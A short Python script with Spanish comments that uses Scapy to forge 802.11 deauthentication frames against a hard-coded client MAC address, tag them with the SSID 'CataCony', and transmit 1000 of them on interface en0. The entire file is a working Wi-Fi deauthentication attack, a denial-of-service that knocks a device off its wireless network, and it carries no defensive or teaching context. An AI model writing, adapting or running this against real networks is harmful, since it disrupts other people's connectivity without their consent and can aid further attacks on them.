from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap


# SSID y dirección MAC de destino
ssid = "CataCony"
mac_destino = "8a:4d:9e:75:89:96"

# Crear paquete Dot11Deauth
pkt = RadioTap() / Dot11(addr1=mac_destino, addr2="ff:ff:ff:ff:ff:ff", addr3="ff:ff:ff:ff:ff:ff") / Dot11Deauth()

# Agregar información del SSID al paquete
pkt = pkt / Dot11Elt(ID="SSID", info=ssid, len=len(ssid))


sendp(pkt, iface="en0",count=1000, inter=0.100)
